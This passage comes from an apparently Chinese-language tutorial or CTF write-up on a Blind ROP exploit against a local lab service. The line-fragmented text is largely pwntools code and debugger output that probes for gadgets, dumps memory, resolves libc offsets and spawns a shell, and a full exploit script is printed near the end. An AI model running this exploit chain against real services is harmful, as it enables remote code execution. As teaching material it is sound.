0x\n%x\n \n%\n \naddr\n)\n\n            \nexcept\n:\n\n                \np\n.\nclose\n()\n\n                \nlog\n.\ninfo\n(\ngadget address: 0x\n%x\n \n%\n \naddr\n)\n\n                \nreturn\n \naddr\n\n        \nexcept\n \nEOFError\n \nas\n \ne\n:\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nbad: 0x\n%x\n \n%\n \naddr\n)\n\n        \nexcept\n:\n\n            \nlog\n.\ninfo\n(\nCan\nt connect\n)\n\n            \naddr\n \n-=\n \n1\n\n\n\n\u76f4\u63a5\u4ece stop gadget \u7684\u5730\u65b9\u5f00\u59cb\u641c\u7d22\u5c31\u53ef\u4ee5\u4e86\u3002\u53e6\u5916\uff0c\u627e\u5230\u4e00\u4e2a\u6b63\u5e38\u8fd4\u56de\u7684\u5730\u5740\u4e4b\u540e\uff0c\u9700\u8981\u8fdb\u884c\u68c0\u67e5\uff0c\u4ee5\u786e\u5b9a\u662f\u5b83\u786e\u5b9e\u662f\u901a\u7528 gadget\u3002\n\n[*] gadget address: 0x40082a\n\n\n\u6709\u4e86\u901a\u7528 gadget\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230 \npop rdi; ret\n \u7684\u5730\u5740\u4e86\uff0c\u5373 gadget address + 9\u3002\n\n\nputs@plt\n\n\nplt \u8868\u5177\u6709\u6bd4\u8f83\u89c4\u6574\u7684\u7ed3\u6784\uff0c\u6bcf\u4e00\u4e2a\u8868\u9879\u90fd\u662f 16 \u5b57\u8282\uff0c\u800c\u5728\u6bcf\u4e2a\u8868\u9879\u7684 6 \u5b57\u8282\u504f\u79fb\u5904\uff0c\u662f\u8be5\u8868\u9879\u5bf9\u5e94\u51fd\u6570\u7684\u89e3\u6790\u8def\u5f84\uff0c\u6240\u4ee5\u5148\u5f97\u5230 plt \u5730\u5740\uff0c\u7136\u540e dump \u51fa\u5185\u5b58\uff0c\u5c31\u53ef\u4ee5\u627e\u5230 got \u5730\u5740\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 puts \u51fd\u6570\u6765 dump \u5185\u5b58\uff0c\u6bd4\u8d77 write\uff0c\u5b83\u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\uff0c\u5f88\u65b9\u4fbf\uff1a\n\ndef\n \nget_puts_plt\n(\nbuf_size\n,\n \nstop_addr\n,\n \ngadgets_addr\n):\n\n    \npop_rdi\n \n=\n \ngadgets_addr\n \n+\n \n9\n      \n# pop rdi; ret;\n\n    \naddr\n \n=\n \nstop_addr\n\n    \nwhile\n \nTrue\n:\n\n        \nsleep\n(\n0.1\n)\n\n        \naddr\n \n+=\n \n1\n\n\n        \npayload\n  \n=\n \nA\n*\nbuf_size\n\n        \npayload\n \n+=\n \np64\n(\npop_rdi\n)\n\n        \npayload\n \n+=\n \np64\n(\n0x400000\n)\n\n        \npayload\n \n+=\n \np64\n(\naddr\n)\n\n        \npayload\n \n+=\n \np64\n(\nstop_addr\n)\n\n        \ntry\n:\n\n            \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nsendline\n(\npayload\n)\n\n            \nif\n \np\n.\nrecv\n()\n.\nstartswith\n(\n\\x7f\nELF\n):\n\n                \nlog\n.\ninfo\n(\nputs@plt address: 0x\n%x\n \n%\n \naddr\n)\n\n                \np\n.\nclose\n()\n\n                \nreturn\n \naddr\n\n            \nlog\n.\ninfo\n(\nbad: 0x\n%x\n \n%\n \naddr\n)\n\n            \np\n.\nclose\n()\n\n        \nexcept\n \nEOFError\n \nas\n \ne\n:\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nbad: 0x\n%x\n \n%\n \naddr\n)\n\n        \nexcept\n:\n\n            \nlog\n.\ninfo\n(\nCan\nt connect\n)\n\n            \naddr\n \n-=\n \n1\n\n\n\n\u8fd9\u91cc\u8ba9 puts \u6253\u5370\u51fa \n0x400000\n \u5730\u5740\u5904\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u8fd9\u91cc\u901a\u5e38\u662f\u7a0b\u5e8f\u5934\u7684\u4f4d\u7f6e\uff08\u5173\u95edPIE\uff09\uff0c\u4e14\u524d\u56db\u4e2a\u5b57\u7b26\u4e3a \n\\x7fELF\n\uff0c\u65b9\u4fbf\u8fdb\u884c\u9a8c\u8bc1\u3002\n\n[*] puts@plt address: 0x4005e7\n\n\n\u6210\u529f\u627e\u5230\u4e00\u4e2a\u5730\u5740\uff0c\u5b83\u786e\u5b9e\u8c03\u7528 puts\uff0c\u6253\u5370\u51fa\u4e86 \n\\x7fELF\n\uff0c\u90a3\u5b83\u771f\u7684\u5c31\u662f puts@plt \u7684\u5730\u5740\u5417\uff0c\u4e0d\u4e00\u5b9a\uff0c\u770b\u4e00\u4e0b\u5457\uff0c\u53cd\u6b63\u6211\u4eec\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\n\ngdb-peda$ disassemble /r 0x4005f0\nDump of assembler code for function puts@plt:\n   0x00000000004005f0 \n+0\n:     ff 25 22 0a 20 00       jmp    QWORD PTR [rip+0x200a22]        # 0x601018\n   0x00000000004005f6 \n+6\n:     68 00 00 00 00  push   0x0\n   0x00000000004005fb \n+11\n:    e9 e0 ff ff ff  jmp    0x4005e0\nEnd of assembler dump.\n\n\n\u4e0d\u5bf9\u5440\uff0cputs@plt \u660e\u660e\u662f\u5728 \n0x4005f0\n\uff0c\u90a3\u4e48 \n0x4005e7\n \u662f\u4ec0\u4e48\u9b3c\u3002\n\ngdb-peda$ pdisass /r 0x4005e7,0x400600\nDump of assembler code from 0x4005e7 to 0x400600:\n   0x00000000004005e7:  25 24 0a 20 00  and    eax,0x200a24\n   0x00000000004005ec:  0f 1f 40 00     nop    DWORD PTR [rax+0x0]\n   0x00000000004005f0 \nputs@plt+0\n:     ff 25 22 0a 20 00       jmp    QWORD PTR [rip+0x200a22]        # 0x601018\n   0x00000000004005f6 \nputs@plt+6\n:     68 00 00 00 00  push   0x0\n   0x00000000004005fb \nputs@plt+11\n:    e9 e0 ff ff ff  jmp    0x4005e0\nEnd of assembler dump.\n\n\n\u539f\u6765\u662f\u7531\u4e8e\u53cd\u6c47\u7f16\u65f6\u5019\u7684\u504f\u79fb\uff0c\u5bfc\u81f4\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5f53\u7136\u4e86\u524d\u4e24\u53e5\u5bf9\u540e\u9762\u7684 puts \u8bed\u53e5\u5e76\u6ca1\u6709\u4ec0\u4e48\u5f71\u54cd\uff0c\u5ffd\u7565\u5b83\uff0c\u5728\u540e\u9762\u7684\u4ee3\u7801\u4e2d\u7ee7\u7eed\u4f7f\u7528 \n0x4005e7\n\u3002\n\n\nremote dump\n\n\n\u6709\u4e86 puts\uff0c\u6709\u4e86 gadget\uff0c\u5c31\u53ef\u4ee5\u7740\u624b dump \u7a0b\u5e8f\u4e86\uff1a\n\ndef\n \ndump_memory\n(\nbuf_size\n,\n \nstop_addr\n,\n \ngadgets_addr\n,\n \nputs_plt\n,\n \nstart_addr\n,\n \nend_addr\n):\n\n    \npop_rdi\n  \n=\n \ngadgets_addr\n \n+\n \n9\n     \n# pop rdi; ret\n\n\n    \nresult\n \n=\n \n\n    \nwhile\n \nstart_addr\n \n \nend_addr\n:\n\n        \n#print result.encode(\nhex\n)\n\n        \nsleep\n(\n0.1\n)\n\n        \npayload\n  \n=\n \nA\n*\nbuf_size\n\n        \npayload\n \n+=\n \np64\n(\npop_rdi\n)\n\n        \npayload\n \n+=\n \np64\n(\nstart_addr\n)\n\n        \npayload\n \n+=\n \np64\n(\nputs_plt\n)\n\n        \npayload\n \n+=\n \np64\n(\nstop_addr\n)\n\n        \ntry\n:\n\n            \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nsendline\n(\npayload\n)\n\n            \ndata\n \n=\n \np\n.\nrecv\n(\ntimeout\n=\n0.1\n)\n      \n# timeout makes sure to recive all bytes\n\n            \nif\n \ndata\n \n==\n \n\\n\n:\n\n                \ndata\n \n=\n \n\\x00\n\n            \nelif\n \ndata\n[\n-\n1\n]\n \n==\n \n\\n\n:\n\n                \ndata\n \n=\n \ndata\n[:\n-\n1\n]\n\n            \nlog\n.\ninfo\n(\nleaking: 0x\n%x\n --\n \n%s\n \n%\n \n(\nstart_addr\n,(\ndata\n \nor\n \n)\n.\nencode\n(\nhex\n)))\n\n            \nresult\n \n+=\n \ndata\n\n            \nstart_addr\n \n+=\n \nlen\n(\ndata\n)\n\n            \np\n.\nclose\n()\n\n        \nexcept\n:\n\n            \nlog\n.\ninfo\n(\nCan\nt connect\n)\n\n    \nreturn\n \nresult\n\n\n\n\u6211\u4eec\u77e5\u9053 puts \u51fd\u6570\u901a\u8fc7 \n\\x00\n \u8fdb\u884c\u622a\u65ad\uff0c\u5e76\u4e14\u4f1a\u5728\u6bcf\u4e00\u6b21\u8f93\u51fa\u672b\u5c3e\u52a0\u4e0a\u6362\u884c\u7b26 \n\\x0a\n\uff0c\u6240\u4ee5\u6709\u4e00\u4e9b\u7279\u6b8a\u60c5\u51b5\u9700\u8981\u505a\u4e00\u4e9b\u5904\u7406\uff0c\u6bd4\u5982\u5355\u72ec\u7684 \n\\x00\n\u3001\n\\x0a\n \u7b49\uff0c\u9996\u5148\u5f53\u7136\u662f\u5148\u53bb\u6389\u672b\u5c3e puts \u81ea\u52a8\u52a0\u4e0a\u7684 \n\\n\n\uff0c\u7136\u540e\u5982\u679c recv \u5230\u4e00\u4e2a \n\\n\n\uff0c\u8bf4\u660e\u5185\u5b58\u4e2d\u662f \n\\x00\n\uff0c\u5982\u679c recv \u5230\u4e00\u4e2a \n\\n\\n\n\uff0c\u8bf4\u660e\u5185\u5b58\u4e2d\u662f \n\\x0a\n\u3002\np.recv(timeout=0.1)\n \u662f\u7531\u4e8e\u51fd\u6570\u672c\u8eab\u7684\u8bbe\u5b9a\uff0c\u5982\u679c\u6709 \n\\n\\n\n\uff0c\u5b83\u5f88\u53ef\u80fd\u5728\u6536\u5230\u7b2c\u4e00\u4e2a \n\\n\n \u65f6\u5c31\u8fd4\u56de\u4e86\uff0c\u52a0\u4e0a\u53c2\u6570\u53ef\u4ee5\u8ba9\u5b83\u5168\u90e8\u63a5\u6536\u5b8c\u3002\n\n\n\u8fd9\u91cc\u9009\u62e9\u4ece \n0x400000\n dump\u5230 \n0x401000\n\uff0c\u8db3\u591f\u4e86\uff0c\u4f60\u8fd8\u53ef\u4ee5 dump \u4e0b data \u6bb5\u7684\u6570\u636e\uff0c\u5927\u6982\u4ece \n0x600000\n \u5f00\u59cb\u3002\n\n\nputs@got\n\n\n\u62ff\u5230 dump \u4e0b\u6765\u7684\u6587\u4ef6\uff0c\u4f7f\u7528 Radare2 \u6253\u5f00\uff0c\u4f7f\u7528\u53c2\u6570 \n-B\n \u6307\u5b9a\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u53cd\u6c47\u7f16 \nputs@plt\n \u7684\u4f4d\u7f6e \n0x4005e7\n\uff0c\u5f53\u7136\u4f60\u8981\u76f4\u63a5\u53cd\u6c47\u7f16 \n0x4005f0\n \u4e5f\u884c\uff1a\n\n$ r2 -B 0x400000 code.bin\n[0x00400630]\n pd 14 @ 0x4005e7\n     ::::   0x004005e7      25240a2000     and eax, 0x200a24                                                                                                                          \n     ::::   0x004005ec      0f1f4000       nop dword [rax]                                                                                                                            \n     ::::   0x004005f0      ff25220a2000   jmp qword [0x00601018]      ; [0x601018:8]=-1                                                                                              \n     ::::   0x004005f6      6800000000     push 0                                                                                                                                     \n     `====\n 0x004005fb      e9e0ffffff     jmp 0x4005e0                                                                                                                               \n      :::   0x00400600      ff251a0a2000   jmp qword [0x00601020]      ; [0x601020:8]=-1                                                                                              \n      :::   0x00400606      6801000000     push 1                      ; 1                                                                                                            \n      `===\n 0x0040060b      e9d0ffffff     jmp 0x4005e0                                                                                                                               \n       ::   0x00400610      ff25120a2000   jmp qword [0x00601028]      ; [0x601028:8]=-1                                                                                              \n       ::   0x00400616      6802000000     push 2                      ; 2                                                                                                            \n       `==\n 0x0040061b      e9c0ffffff     jmp 0x4005e0                                                                                                                               \n        :   0x00400620      ff250a0a2000   jmp qword [0x00601030]      ; [0x601030:8]=-1                                                                                              \n        :   0x00400626      6803000000     push 3                      ; 3                                                                                                            \n        `=\n 0x0040062b      e9b0ffffff     jmp 0x4005e0\n\n\n\u4e8e\u662f\u6211\u4eec\u5c31\u5f97\u5230\u4e86 puts@got \u5730\u5740 \n0x00601018\n\u3002\u53ef\u4ee5\u770b\u5230\u8be5\u8868\u4e2d\u8fd8\u6709\u5176\u4ed6\u51e0\u4e2a\u51fd\u6570\uff0c\u6839\u636e\u7a0b\u5e8f\u7684\u529f\u80fd\u5927\u6982\u53ef\u4ee5\u731c\u5230\uff0c\u65e0\u975e\u5c31\u662f setbuf\u3001read \u4e4b\u7c7b\u7684\uff0c\u5728\u540e\u9762\u7684\u8fc7\u7a0b\u4e2d\u5982\u679c\u5b9e\u5728\u65e0\u6cd5\u786e\u5b9a libc\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u6709\u7528\u3002\n\n\nattack\n\n\n\u540e\u9762\u7684\u8fc7\u7a0b\u548c\u65e0 libc \u7684\u5229\u7528\u5dee\u4e0d\u591a\u4e86\uff0c\u5148\u4f7f\u7528 puts \u6253\u5370\u51fa\u5176\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\uff0c\u7136\u540e\u5728 libc-database \u91cc\u67e5\u627e\u76f8\u5e94\u7684 libc\uff0c\u4e5f\u5c31\u662f\u76ee\u6807\u673a\u5668\u4e0a\u7684 libc\uff0c\u901a\u8fc7\u504f\u79fb\u8ba1\u7b97\u51fa \nsystem()\n \u51fd\u6570\u548c\u5b57\u7b26\u4e32 \n/bin/sh\n \u7684\u5730\u5740\uff0c\u6784\u9020 payload \u5c31\u53ef\u4ee5\u4e86\u3002\n\n\ndef\n \nget_puts_addr\n(\nbuf_size\n,\n \nstop_addr\n,\n \ngadgets_addr\n,\n \nputs_plt\n,\n \nputs_got\n):\n\n    \npop_rdi\n  \n=\n \ngadgets_addr\n \n+\n \n9\n\n\n    \npayload\n  \n=\n \nA\n*\nbuf_size\n\n    \npayload\n \n+=\n \np64\n(\npop_rdi\n)\n\n    \npayload\n \n+=\n \np64\n(\nputs_got\n)\n\n    \npayload\n \n+=\n \np64\n(\nputs_plt\n)\n\n    \npayload\n \n+=\n \np64\n(\nstop_addr\n)\n\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n    \np\n.\nrecvline\n()\n\n    \np\n.\nsendline\n(\npayload\n)\n\n    \ndata\n \n=\n \np\n.\nrecvline\n()\n\n    \ndata\n \n=\n \nu64\n(\ndata\n[:\n-\n1\n]\n \n+\n \n\\x00\\x00\n)\n\n    \nlog\n.\ninfo\n(\nputs address: 0x\n%x\n \n%\n \ndata\n)\n\n    \np\n.\nclose\n()\n\n\n    \nreturn\n \ndata\n\n\n\n\n[*] puts address: 0x7ffff7a90210\n\n\n\n\u8fd9\u91cc\u63d2\u4e00\u4e0b \nlibc-database\n \u7684\u7528\u6cd5\uff0c\u7531\u4e8e\u6211\u672c\u5730\u7684 libc \u7248\u672c\u6bd4\u8f83\u65b0\uff0c\u53ef\u80fd\u672a\u6536\u5f55\uff0c\u5c31\u76f4\u63a5\u5c06\u5b83\u6dfb\u52a0\u8fdb\u53bb\u597d\u4e86\uff1a\n\n$ ./add /usr/lib/libc-2.26.so   \nAdding local libc /usr/lib/libc-2.26.so (id local-e112b79b632f33fce6908f5ffd2f61a5d8058570  /usr/lib/libc-2.26.so)\n  -\n Writing libc to db/local-e112b79b632f33fce6908f5ffd2f61a5d8058570.so\n  -\n Writing symbols to db/local-e112b79b632f33fce6908f5ffd2f61a5d8058570.symbols\n  -\n Writing version info\n\n\n\u7136\u540e\u67e5\u8be2\uff08ASLR \u5e76\u4e0d\u5f71\u54cd\u540e 12 \u4f4d\u7684\u503c\uff09\uff1a\n\n$ ./find puts 210\n/usr/lib/libc-2.26.so (id local-e112b79b632f33fce6908f5ffd2f61a5d8058570)\n$ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570\noffset___libc_start_main_ret = 0x20f6a\noffset_system = 0x0000000000042010\noffset_dup2 = 0x00000000000e8100\noffset_read = 0x00000000000e7820\noffset_write = 0x00000000000e78c0\noffset_str_bin_sh = 0x17aff5\n$ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts\noffset_puts = 0x000000000006f210\n\n\n\noffset_puts\n   \n=\n \n0x000000000006f210\n\n\noffset_system\n \n=\n \n0x0000000000042010\n\n\noffset_str_bin_sh\n \n=\n \n0x17aff5\n\n\n\nsystem_addr\n \n=\n \n(\nputs_addr\n \n-\n \noffset_puts\n)\n \n+\n \noffset_system\n\n\nbinsh_addr\n  \n=\n \n(\nputs_addr\n \n-\n \noffset_puts\n)\n \n+\n \noffset_str_bin_sh\n\n\n\n# get shell\n\n\npayload\n  \n=\n \nA\n*\nbuf_size\n\n\npayload\n \n+=\n \np64\n(\ngadgets_addr\n \n+\n \n9\n)\n    \n# pop rdi; ret;\n\n\npayload\n \n+=\n \np64\n(\nbinsh_addr\n)\n\n\npayload\n \n+=\n \np64\n(\nsystem_addr\n)\n\n\npayload\n \n+=\n \np64\n(\nstop_addr\n)\n\n\n\np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n\np\n.\nrecvline\n()\n\n\np\n.\nsendline\n(\npayload\n)\n\n\np\n.\ninteractive\n()\n\n\n\nBingo!!!\n\n$ python2 exp.py\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] Switching to interactive mode\n$ whoami\nfirmy\n\n\n\nExploit\n\n\n\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\n#context.log_level = \ndebug\n\n\n\ndef\n \nget_buffer_size\n():\n\n    \nfor\n \ni\n \nin\n \nrange\n(\n100\n):\n\n        \npayload\n  \n=\n \nA\n\n        \npayload\n \n+=\n \nA\n*\ni\n\n        \nbuf_size\n \n=\n \nlen\n(\npayload\n)\n \n-\n \n1\n\n        \ntry\n:\n\n            \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nsend\n(\npayload\n)\n\n            \np\n.\nrecv\n()\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nbad: \n%d\n \n%\n \nbuf_size\n)\n\n        \nexcept\n \nEOFError\n \nas\n \ne\n:\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nbuffer size: \n%d\n \n%\n \nbuf_size\n)\n\n            \nreturn\n \nbuf_size\n\n\n\ndef\n \nget_stop_addr\n(\nbuf_size\n):\n\n    \naddr\n \n=\n \n0x400000\n\n    \nwhile\n \nTrue\n:\n\n        \nsleep\n(\n0.1\n)\n\n        \naddr\n \n+=\n \n1\n\n        \npayload\n  \n=\n \nA\n*\nbuf_size\n\n        \npayload\n \n+=\n \np64\n(\naddr\n)\n\n        \ntry\n:\n\n            \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nsendline\n(\npayload\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nstop address: 0x\n%x\n \n%\n \naddr\n)\n\n            \nreturn\n \naddr\n\n        \nexcept\n \nEOFError\n \nas\n \ne\n:\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nbad: 0x\n%x\n \n%\n \naddr\n)\n\n        \nexcept\n:\n\n            \nlog\n.\ninfo\n(\nCan\nt connect\n)\n\n            \naddr\n \n-=\n \n1\n\n\n\ndef\n \nget_gadgets_addr\n(\nbuf_size\n,\n \nstop_addr\n):\n\n    \naddr\n \n=\n \nstop_addr\n\n    \nwhile\n \nTrue\n:\n\n        \nsleep\n(\n0.1\n)\n\n        \naddr\n \n+=\n \n1\n\n        \npayload\n  \n=\n \nA\n*\nbuf_size\n\n        \npayload\n \n+=\n \np64\n(\naddr\n)\n\n        \npayload\n \n+=\n \np64\n(\n1\n)\n \n+\n \np64\n(\n2\n)\n \n+\n \np64\n(\n3\n)\n \n+\n \np64\n(\n4\n)\n \n+\n \np64\n(\n5\n)\n \n+\n \np64\n(\n6\n)\n\n        \npayload\n \n+=\n \np64\n(\nstop_addr\n)\n\n        \ntry\n:\n\n            \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nsendline\n(\npayload\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nfind address: 0x\n%x\n \n%\n \naddr\n)\n\n            \ntry\n:\n    \n# check\n\n                \npayload\n  \n=\n \nA\n*\nbuf_size\n\n                \npayload\n \n+=\n \np64\n(\naddr\n)\n\n                \npayload\n \n+=\n \np64\n(\n1\n)\n \n+\n \np64\n(\n2\n)\n \n+\n \np64\n(\n3\n)\n \n+\n \np64\n(\n4\n)\n \n+\n \np64\n(\n5\n)\n \n+\n \np64\n(\n6\n)\n\n\n                \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n                \np\n.\nrecvline\n()\n\n                \np\n.\nsendline\n(\npayload\n)\n\n                \np\n.\nrecvline\n()\n\n                \np\n.\nclose\n()\n\n                \nlog\n.\ninfo\n(\nbad address: 0x\n%x\n \n%\n \naddr\n)\n\n            \nexcept\n:\n\n                \np\n.\nclose\n()\n\n                \nlog\n.\ninfo\n(\ngadget address: 0x\n%x\n \n%\n \naddr\n)\n\n                \nreturn\n \naddr\n\n        \nexcept\n \nEOFError\n \nas\n \ne\n:\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nbad: 0x\n%x\n \n%\n \naddr\n)\n\n        \nexcept\n:\n\n            \nlog\n.\ninfo\n(\nCan\nt connect\n)\n\n            \naddr\n \n-=\n \n1\n\n\n\ndef\n \nget_puts_plt\n(\nbuf_size\n,\n \nstop_addr\n,\n \ngadgets_addr\n):\n\n    \npop_rdi\n \n=\n \ngadgets_addr\n \n+\n \n9\n      \n# pop rdi; ret;\n\n    \naddr\n \n=\n \nstop_addr\n\n    \nwhile\n \nTrue\n:\n\n        \nsleep\n(\n0.1\n)\n\n        \naddr\n \n+=\n \n1\n\n\n        \npayload\n  \n=\n \nA\n*\nbuf_size\n\n        \npayload\n \n+=\n \np64\n(\npop_rdi\n)\n\n        \npayload\n \n+=\n \np64\n(\n0x400000\n)\n\n        \npayload\n \n+=\n \np64\n(\naddr\n)\n\n        \npayload\n \n+=\n \np64\n(\nstop_addr\n)\n\n        \ntry\n:\n\n            \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nsendline\n(\npayload\n)\n\n            \nif\n \np\n.\nrecv\n()\n.\nstartswith\n(\n\\x7f\nELF\n):\n\n                \nlog\n.\ninfo\n(\nputs@plt address: 0x\n%x\n \n%\n \naddr\n)\n\n                \np\n.\nclose\n()\n\n                \nreturn\n \naddr\n\n            \nlog\n.\ninfo\n(\nbad: 0x\n%x\n \n%\n \naddr\n)\n\n            \np\n.\nclose\n()\n\n        \nexcept\n \nEOFError\n \nas\n \ne\n:\n\n            \np\n.\nclose\n()\n\n            \nlog\n.\ninfo\n(\nbad: 0x\n%x\n \n%\n \naddr\n)\n\n        \nexcept\n:\n\n            \nlog\n.\ninfo\n(\nCan\nt connect\n)\n\n            \naddr\n \n-=\n \n1\n\n\n\ndef\n \ndump_memory\n(\nbuf_size\n,\n \nstop_addr\n,\n \ngadgets_addr\n,\n \nputs_plt\n,\n \nstart_addr\n,\n \nend_addr\n):\n\n    \npop_rdi\n  \n=\n \ngadgets_addr\n \n+\n \n9\n     \n# pop rdi; ret\n\n\n    \nresult\n \n=\n \n\n    \nwhile\n \nstart_addr\n \n \nend_addr\n:\n\n        \n#print result.encode(\nhex\n)\n\n        \nsleep\n(\n0.1\n)\n\n        \npayload\n  \n=\n \nA\n*\nbuf_size\n\n        \npayload\n \n+=\n \np64\n(\npop_rdi\n)\n\n        \npayload\n \n+=\n \np64\n(\nstart_addr\n)\n\n        \npayload\n \n+=\n \np64\n(\nputs_plt\n)\n\n        \npayload\n \n+=\n \np64\n(\nstop_addr\n)\n\n        \ntry\n:\n\n            \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n            \np\n.\nrecvline\n()\n\n            \np\n.\nsendline\n(\npayload\n)\n\n            \ndata\n \n=\n \np\n.\nrecv\n(\ntimeout\n=\n0.1\n)\n      \n# timeout makes sure to recive all bytes\n\n            \nif\n \ndata\n \n==\n \n\\n\n:\n\n                \ndata\n \n=\n \n\\x00\n\n            \nelif\n \ndata\n[\n-\n1\n]\n \n==\n \n\\n\n:\n\n                \ndata\n \n=\n \ndata\n[:\n-\n1\n]\n\n            \nlog\n.\ninfo\n(\nleaking: 0x\n%x\n --\n \n%s\n \n%\n \n(\nstart_addr\n,(\ndata\n \nor\n \n)\n.\nencode\n(\nhex\n)))\n\n            \nresult\n \n+=\n \ndata\n\n            \nstart_addr\n \n+=\n \nlen\n(\ndata\n)\n\n            \np\n.\nclose\n()\n\n        \nexcept\n:\n\n            \nlog\n.\ninfo\n(\nCan\nt connect\n)\n\n    \nreturn\n \nresult\n\n\n\ndef\n \nget_puts_addr\n(\nbuf_size\n,\n \nstop_addr\n,\n \ngadgets_addr\n,\n \nputs_plt\n,\n \nputs_got\n):\n\n    \npop_rdi\n  \n=\n \ngadgets_addr\n \n+\n \n9\n\n\n    \npayload\n  \n=\n \nA\n*\nbuf_size\n\n    \npayload\n \n+=\n \np64\n(\npop_rdi\n)\n\n    \npayload\n \n+=\n \np64\n(\nputs_got\n)\n\n    \npayload\n \n+=\n \np64\n(\nputs_plt\n)\n\n    \npayload\n \n+=\n \np64\n(\nstop_addr\n)\n\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n    \np\n.\nrecvline\n()\n\n    \np\n.\nsendline\n(\npayload\n)\n\n    \ndata\n \n=\n \np\n.\nrecvline\n()\n\n    \ndata\n \n=\n \nu64\n(\ndata\n[:\n-\n1\n]\n \n+\n \n\\x00\\x00\n)\n\n    \nlog\n.\ninfo\n(\nputs address: 0x\n%x\n \n%\n \ndata\n)\n\n    \np\n.\nclose\n()\n\n\n    \nreturn\n \ndata\n\n\n\n#buf_size = get_buffer_size()\n\n\nbuf_size\n \n=\n \n72\n\n\n\n#stop_addr = get_stop_addr(buf_size)\n\n\nstop_addr\n \n=\n \n0x4005e5\n\n\n\n#gadgets_addr = get_gadgets_addr(buf_size, stop_addr)\n\n\ngadgets_addr\n \n=\n \n0x40082a\n\n\n\n#puts_plt = get_puts_plt(buf_size, stop_addr, gadgets_addr)\n\n\nputs_plt\n \n=\n \n0x4005e7\n     \n# fake puts\n\n\n#puts_plt = 0x4005f0    # true puts\n\n\n\n# dump code section from memory\n\n\n# and then use Radare2 or IDA Pro to find the got address\n\n\n#start_addr = 0x400000\n\n\n#end_addr   = 0x401000\n\n\n#code_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)\n\n\n#with open(\ncode.bin\n, \nwb\n) as f:\n\n\n#   f.write(code_bin)\n\n\n#   f.close()\n\n\nputs_got\n \n=\n \n0x00601018\n\n\n\n# you can also dump data from memory and get information from .got\n\n\n#start_addr = 0x600000\n\n\n#end_addr   = 0x602000\n\n\n#data_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)\n\n\n#with open(\ndata.bin\n, \nwb\n) as f:\n\n\n#    f.write(data_bin)\n\n\n#    f.close()\n\n\n\n# must close ASLR\n\n\n#puts_addr = get_puts_addr(buf_size, stop_addr, gadgets_addr, puts_plt, puts_got)\n\n\nputs_addr\n \n=\n \n0x7ffff7a90210\n\n\n\n# first add your own libc into libc-database: $ ./add /usr/lib/libc-2.26.so\n\n\n# $ ./find puts 0x7ffff7a90210\n\n\n# or $ ./find puts 210\n\n\n# $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570\n\n\n# $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts\n\n\n# then you can get the following offset\n\n\noffset_puts\n   \n=\n \n0x000000000006f210\n\n\noffset_system\n \n=\n \n0x0000000000042010\n\n\noffset_str_bin_sh\n \n=\n \n0x17aff5\n\n\n\nsystem_addr\n \n=\n \n(\nputs_addr\n \n-\n \noffset_puts\n)\n \n+\n \noffset_system\n\n\nbinsh_addr\n  \n=\n \n(\nputs_addr\n \n-\n \noffset_puts\n)\n \n+\n \noffset_str_bin_sh\n\n\n\n# get shell\n\n\npayload\n  \n=\n \nA\n*\nbuf_size\n\n\npayload\n \n+=\n \np64\n(\ngadgets_addr\n \n+\n \n9\n)\n    \n# pop rdi; ret;\n\n\npayload\n \n+=\n \np64\n(\nbinsh_addr\n)\n\n\npayload\n \n+=\n \np64\n(\nsystem_addr\n)\n\n\npayload\n \n+=\n \np64\n(\nstop_addr\n)\n\n\n\np\n \n=\n \nremote\n(\n127.0.0.1\n,\n 